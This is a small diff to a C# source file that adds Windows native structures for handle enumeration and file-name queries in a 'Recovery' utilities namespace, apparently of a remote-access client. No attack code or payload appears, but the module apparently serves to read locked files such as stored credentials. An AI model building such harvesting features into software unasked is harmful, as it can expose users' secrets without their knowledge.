@@ -487,5 +487,28 @@ namespace Pulsar.Client.Recovery.Utilities.Xeno
                             DESKTOP_HOOKCONTROL | DESKTOP_JOURNALRECORD | DESKTOP_JOURNALPLAYBACK |
                             DESKTOP_ENUMERATE | DESKTOP_WRITEOBJECTS | DESKTOP_SWITCHDESKTOP,
         }
+
+        [StructLayout(LayoutKind.Sequential)]
+        public struct IO_STATUS_BLOCK
+        {
+            public uint Status;
+            public IntPtr Information;
+        }
+
+        [StructLayout(LayoutKind.Sequential)]
+        public struct FILE_NAME_INFORMATION
+        {
+            public uint FileNameLength;
+        }
+
+        public const uint FileNameInformation = 9;
+
+        [StructLayout(LayoutKind.Sequential)]
+        public struct SYSTEM_HANDLE_INFORMATION_EX
+        {
+            public IntPtr NumberOfHandles;
+            public IntPtr Reserved;
+            // SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX HandleList[1];
+        }
     }
 }
